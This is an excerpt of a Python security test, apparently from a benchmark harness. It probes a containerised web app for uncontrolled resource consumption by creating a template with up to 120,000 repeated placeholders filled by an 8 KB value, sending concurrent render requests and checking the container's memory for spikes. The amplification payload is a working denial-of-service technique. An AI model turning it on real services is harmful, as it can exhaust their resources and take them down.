...
def sec_test_uncontrolled_resource_consumption(
    ...
    if not token:
        logger.error(
            "Failed to obtain token; cannot proceed with DoS amplification test"
        )
        return findings

    # 2) Create an amplifier template: many repeated placeholders for a single variable X
    repeated_placeholder = "{{X}}"
    template_id: Optional[str] = None
    chosen_N: Optional[int] = None

    # Start with large but more realistic sizes to avoid pathological timeouts
    candidates = [120_000, 100_000, 80_000, 60_000]
    for N in candidates:
        body_html = "<html><body>" + (repeated_placeholder * N) + "</body></html>"
        template_id = _make_template(app, token, body_html, None, logger)
        if template_id:
            chosen_N = N
            logger.info("Using amplifier template with %d placeholders", N)
            break

    if not template_id or not chosen_N:
        logger.error("Could not create any amplifier template; aborting")
        return findings

    # 3) Prepare a moderately large variable value (8 KB) including a unique marker
    marker = generate_marker()
    var_size = 8 * 1024  # 8 KB
    if len(marker) >= var_size:
        var_size = len(marker) + 16  # ensure marker fits with a small pad
    padding = "A" * (var_size - len(marker))
    var_value = marker + padding
    variables = {"X": var_value}

    # 4) Start resource monitoring in background with a sane duration and threshold
    amplified_bytes = chosen_N * var_size  # rough estimate for output size
    duration = 35  # seconds to monitor; keep short to ensure completion
    lower_bound = 128 * 1024 * 1024  # 128MB
    upper_bound = 1024 * 1024 * 1024  # 1GB
    # Use a conservative fraction of expected amplification, bounded to avoid extreme values
    threshold = max(lower_bound, min(upper_bound, amplified_bytes // 16))

    # Capture a baseline as a fallback if monitor completion is delayed
    baseline_usage = None
    try:
        baseline_usage = memory_usage(app.container_id)
        logger.info("Baseline memory usage: %.2fMB", baseline_usage / (1024 * 1024))
    except Exception as e:
        logger.warning("Failed to read baseline memory usage: %r", e)

    logger.info(
        "Starting resource monitoring for %ds with memory threshold ~%d MB (expected amplification ~%.2f GB)",
        duration,
        threshold // (1024 * 1024),
        amplified_bytes / (1024**3),
    )
    ...
    # 5) Trigger multiple concurrent renders to increase pressure
    render_url = f"{base_url(app)}/render/{template_id}"
    headers = auth_headers(token)

    def render_once() -> Optional[int]:
        try:
            r = requests.post(
                render_url, headers=headers, json={"variables": variables}, timeout=60
            )
            logger.info("Render attempt completed with status %s", r.status_code)
            return r.status_code
        except Exception as e:
            logger.warning("Render attempt failed with exception: %r", e)
            return None

    render_futures = [executor.submit(render_once) for _ in range(2)]
    for f in as_completed(render_futures, timeout=duration + 5):
        try:
            _ = f.result()
        except Exception as e:
            logger.warning("Render future raised: %r", e)

    # 6) Wait for monitoring result with adequate timeout; if it fails, use a fallback heuristic
    spike_detected = False
    try:
        spike_detected = bool(monitor_future.result(timeout=duration + 10))
    except Exception as e:
        logger.warning("Monitoring did not complete cleanly: %r", e)
        # Fallback: compare current memory with baseline if available
        if baseline_usage is not None:
            try:
                current_usage = memory_usage(app.container_id)
                delta = current_usage - baseline_usage
                logger.info(
                    "Fallback memory delta: %.2fMB",
                    delta / (1024 * 1024),
                )
                if delta > (128 * 1024 * 1024):  # >128MB increase
                    spike_detected = True
            except Exception as e2:
                logger.warning("Fallback memory check failed: %r", e2)

    executor.shutdown(wait=False)

    if spike_detected:
        logger.info(
            "Memory spike detected above threshold; uncontrolled resource consumption likely exploitable."
        )
        findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)
    else:
        logger.info("No significant memory spike detected within monitoring window.")
